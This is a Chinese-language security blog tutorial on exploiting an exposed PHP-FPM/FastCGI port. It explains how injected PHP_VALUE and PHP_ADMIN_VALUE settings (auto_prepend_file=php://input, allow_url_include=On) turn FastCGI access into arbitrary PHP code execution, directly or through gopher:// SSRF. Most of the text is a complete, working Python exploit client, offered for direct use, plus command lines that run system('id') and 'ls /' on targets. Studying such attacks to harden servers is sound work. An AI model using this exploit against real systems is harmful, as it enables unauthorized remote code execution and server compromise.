<h1 id="PHP-FPM未授权访问漏洞"><a href="#PHP-FPM未授权访问漏洞" class="headerlink" title="PHP-FPM未授权访问漏洞"></a>PHP-FPM未授权访问漏洞</h1><p>写到这里，PHP-FPM未授权访问漏洞也就呼之欲出了。</p>
<p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。构造数据包通过给SCRIPT_FILENAME赋值，达到执行任意PHP文件的目的了。但是由于FPM某版本后配置文件添加了security.limit_extensions选项，用于指定解析文件的后缀，并且默认值为<code>.php</code>，这样让我们无法通过任意文件包含达到代码执行的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; exectute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions = .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure>

<p>其限定了只有某些后缀的文件允许被fpm执行，默认是<code>.php</code>。所以，当我们再传入<code>/etc/passwd</code>的时候，将会返回<code>Access denied.</code>：</p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923134753697.png" alt="image-20220923134753697"></p>
<blockquote>
<p>ps. 这个配置也会影响Nginx解析漏洞，我觉得应该是因为Nginx当时那个解析漏洞，促成PHP-FPM增加了这个安全选项。另外，也有少部分发行版安装中<code>security.limit_extensions</code>默认为空，此时就没有任何限制了。</p>
</blockquote>
<p>由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p>
<p>万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用<code>find / -name &quot;*.php&quot;</code>来全局搜索一下默认环境：</p>
<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923134905718.png" alt="image-20220923134905718"></p>
<p>找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</p>
<h1 id="PHP-FPM任意代码执行"><a href="#PHP-FPM任意代码执行" class="headerlink" title="PHP-FPM任意代码执行"></a>PHP-FPM任意代码执行</h1><p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p>
<p>理论上当然是不可以的，即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p>
<p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p>
<p><em><strong><code>auto_prepend_file</code>：</strong></em>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；</p>
<p>***<code>auto_append_file</code>***是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p>
<p>那么就有趣了，假设我们设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p>
<p>那么，我们怎么设置<code>auto_prepend_file</code>的值？</p>
<p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
<p>所以，我们最后传入如下环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">python fpm.py xxx.xxx.xxx.xxx /var/www/html/index.php -c &quot;&lt;?php system(&#x27;ls /&#x27;); exit(); ?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>p神的脚本：<a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<h1 id="远程攻击PHP-FPM"><a href="#远程攻击PHP-FPM" class="headerlink" title="远程攻击PHP-FPM"></a>远程攻击PHP-FPM</h1><p>前文我们讲到，攻击者可以通过 <code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code> 这两个环境变量设置 PHP 配置选项 <code>auto_prepend_file</code> 和 <code>allow_url_include</code> ，从而使 PHP-FPM 执行我们提供的任意代码，造成任意代码执行。除此之外，由于 PHP-FPM 和 Web 服务器中间件是通过网络进行沟通的，因此目前越来越多的集群将 PHP-FPM 直接绑定在公网上，所有人都可以对其进行访问。这样就意味着，任何人都可以伪装成Web服务器中间件来让 PHP-FPM 执行我们想执行的恶意代码。这就造成了 PHP-FPM 的未授权访问漏洞。</p>
<p>当我们的PHP-FPM绑定在0.0.0.0上面，任意主机都可访问时。</p>
<p>直接使用上面p神的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">兼容Python2和Python3，方便在内网用</span><br><span class="line">python fpm.py -c &#x27;&lt;?php echo `id`;exit;?&gt;&#x27; -p 9000 xxx.xxx.xxx.xxx /var/www/html/index.php</span><br></pre></td></tr></table></figure>

<h1 id="SSRF攻击本地PHP-FPM"><a href="#SSRF攻击本地PHP-FPM" class="headerlink" title="SSRF攻击本地PHP-FPM"></a>SSRF攻击本地PHP-FPM</h1><h4 id="利用fpm-py脚本"><a href="#利用fpm-py脚本" class="headerlink" title="利用fpm.py脚本"></a>利用fpm.py脚本</h4><p>依旧可以使用p神的脚本（需要稍加修改）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import random</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from io import BytesIO</span><br><span class="line">from six.moves.urllib import parse as urlparse</span><br><span class="line"></span><br><span class="line"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><span class="line"></span><br><span class="line">PY2 = True if sys.version_info.major == 2 else False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bchr(i):</span><br><span class="line">    if PY2:</span><br><span class="line">        return force_bytes(chr(i))</span><br><span class="line">    else:</span><br><span class="line">        return bytes([i])</span><br><span class="line"></span><br><span class="line">def bord(c):</span><br><span class="line">    if isinstance(c, int):</span><br><span class="line">        return c</span><br><span class="line">    else:</span><br><span class="line">        return ord(c)</span><br><span class="line"></span><br><span class="line">def force_bytes(s):</span><br><span class="line">    if isinstance(s, bytes):</span><br><span class="line">        return s</span><br><span class="line">    else:</span><br><span class="line">        return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)</span><br><span class="line"></span><br><span class="line">def force_text(s):</span><br><span class="line">    if issubclass(type(s), str):</span><br><span class="line">        return s</span><br><span class="line">    if isinstance(s, bytes):</span><br><span class="line">        s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        s = str(s)</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class FastCGIClient:</span><br><span class="line">    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # private</span><br><span class="line">    __FCGI_VERSION = 1</span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = 1</span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = 2</span><br><span class="line">    __FCGI_ROLE_FILTER = 3</span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = 1</span><br><span class="line">    __FCGI_TYPE_ABORT = 2</span><br><span class="line">    __FCGI_TYPE_END = 3</span><br><span class="line">    __FCGI_TYPE_PARAMS = 4</span><br><span class="line">    __FCGI_TYPE_STDIN = 5</span><br><span class="line">    __FCGI_TYPE_STDOUT = 6</span><br><span class="line">    __FCGI_TYPE_STDERR = 7</span><br><span class="line">    __FCGI_TYPE_DATA = 8</span><br><span class="line">    __FCGI_TYPE_GETVALUES = 9</span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = 10</span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = 11</span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = 8</span><br><span class="line"></span><br><span class="line">    # request state</span><br><span class="line">    FCGI_STATE_SEND = 1</span><br><span class="line">    FCGI_STATE_ERROR = 2</span><br><span class="line">    FCGI_STATE_SUCCESS = 3</span><br><span class="line"></span><br><span class="line">    def __init__(self, host, port, timeout, keepalive):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        if keepalive:</span><br><span class="line">            self.keepalive = 1</span><br><span class="line">        else:</span><br><span class="line">            self.keepalive = 0</span><br><span class="line">        self.sock = None</span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    def __connect(self):</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">        # if self.keepalive:</span><br><span class="line">        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br><span class="line">        # else:</span><br><span class="line">        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br><span class="line">        try:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        except socket.error as msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = None</span><br><span class="line">            print(repr(msg))</span><br><span class="line">            return False</span><br><span class="line">        #return True</span><br><span class="line"></span><br><span class="line">    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):</span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \</span><br><span class="line">               + bchr(requestid &amp; 0xFF) \</span><br><span class="line">               + bchr((length &gt;&gt; 8) &amp; 0xFF) \</span><br><span class="line">               + bchr(length &amp; 0xFF) \</span><br><span class="line">               + bchr(0) \</span><br><span class="line">               + bchr(0) \</span><br><span class="line">               + content</span><br><span class="line">        return buf</span><br><span class="line"></span><br><span class="line">    def __encodeNameValueParams(self, name, value):</span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = b&#x27;&#x27;</span><br><span class="line">        if nLen &lt; 128:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        else:</span><br><span class="line">            record += bchr((nLen &gt;&gt; 24) | 0x80) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \</span><br><span class="line">                      + bchr(nLen &amp; 0xFF)</span><br><span class="line">        if vLen &lt; 128:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        else:</span><br><span class="line">            record += bchr((vLen &gt;&gt; 24) | 0x80) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \</span><br><span class="line">                      + bchr(vLen &amp; 0xFF)</span><br><span class="line">        return record + name + value</span><br><span class="line"></span><br><span class="line">    def __decodeFastCGIHeader(self, stream):</span><br><span class="line">        header = dict()</span><br><span class="line">        header[&#x27;version&#x27;] = bord(stream[0])</span><br><span class="line">        header[&#x27;type&#x27;] = bord(stream[1])</span><br><span class="line">        header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])</span><br><span class="line">        header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])</span><br><span class="line">        header[&#x27;paddingLength&#x27;] = bord(stream[6])</span><br><span class="line">        header[&#x27;reserved&#x27;] = bord(stream[7])</span><br><span class="line">        return header</span><br><span class="line"></span><br><span class="line">    def __decodeFastCGIRecord(self, buffer):</span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        if not header:</span><br><span class="line">            return False</span><br><span class="line">        else:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[&#x27;content&#x27;] = b&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">            if &#x27;contentLength&#x27; in record.keys():</span><br><span class="line">                contentLength = int(record[&#x27;contentLength&#x27;])</span><br><span class="line">                record[&#x27;content&#x27;] += buffer.read(contentLength)</span><br><span class="line">            if &#x27;paddingLength&#x27; in record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[&#x27;paddingLength&#x27;]))</span><br><span class="line">            return record</span><br><span class="line"></span><br><span class="line">    def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;):</span><br><span class="line">        if not self.__connect():</span><br><span class="line">            print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = b&quot;&quot;</span><br><span class="line">        beginFCGIRecordContent = bchr(0) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(0) * 5</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = b&#x27;&#x27;</span><br><span class="line">        if nameValuePairs:</span><br><span class="line">            for (name, value) in nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        if paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId)</span><br><span class="line"></span><br><span class="line">        if post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId)</span><br><span class="line"></span><br><span class="line">        # 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request</span><br><span class="line">        #self.sock.send(request)</span><br><span class="line">        #self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        #self.requests[requestId][&#x27;response&#x27;] = &#x27;&#x27;</span><br><span class="line">        #return self.__waitForResponse(requestId)</span><br><span class="line">        return request</span><br><span class="line"></span><br><span class="line">    def __waitForResponse(self, requestId):</span><br><span class="line">        data = b&#x27;&#x27;</span><br><span class="line">        while True:</span><br><span class="line">            buf = self.sock.recv(512)</span><br><span class="line">            if not len(buf):</span><br><span class="line">                break</span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        while True:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            if not response:</span><br><span class="line">                break</span><br><span class="line">            if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                if requestId == int(response[&#x27;requestId&#x27;]):</span><br><span class="line">                    self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;]</span><br><span class="line">            if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        return self.requests[requestId][&#x27;response&#x27;]</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, 3, 0)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = &quot;/&quot;</span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">        &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;,</span><br><span class="line">        &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;),</span><br><span class="line">        &#x27;SCRIPT_NAME&#x27;: uri,</span><br><span class="line">        &#x27;QUERY_STRING&#x27;: &#x27;&#x27;,</span><br><span class="line">        &#x27;REQUEST_URI&#x27;: uri,</span><br><span class="line">        &#x27;DOCUMENT_ROOT&#x27;: documentRoot,</span><br><span class="line">        &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">        &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">        &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;,</span><br><span class="line">        &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">        &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">        &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">        &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;,</span><br><span class="line">        &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;,</span><br><span class="line">        &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content),</span><br><span class="line">        &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class="line">        &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    # 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了</span><br><span class="line">    #response = client.request(params, content)</span><br><span class="line">    #print(force_text(response))</span><br><span class="line">    request_ssrf = urlparse.quote(client.request(params, content))</span><br><span class="line">    print(&quot;gopher://127.0.0.1:&quot; + str(args.port) + &quot;/_&quot; + request_ssrf)</span><br></pre></td></tr></table></figure>

<p>脚本用法一样的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">python fpm.py -c &quot;&lt;?php system(&#x27;id&#x27;); exit(); ?&gt;&quot; -p 9000 127.0.0.1 /var/www/html/index.php </span><br></pre></td></tr></table></figure>

<h4 id="利用Gopherus"><a href="#利用Gopherus" class="headerlink" title="利用Gopherus"></a>利用Gopherus</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
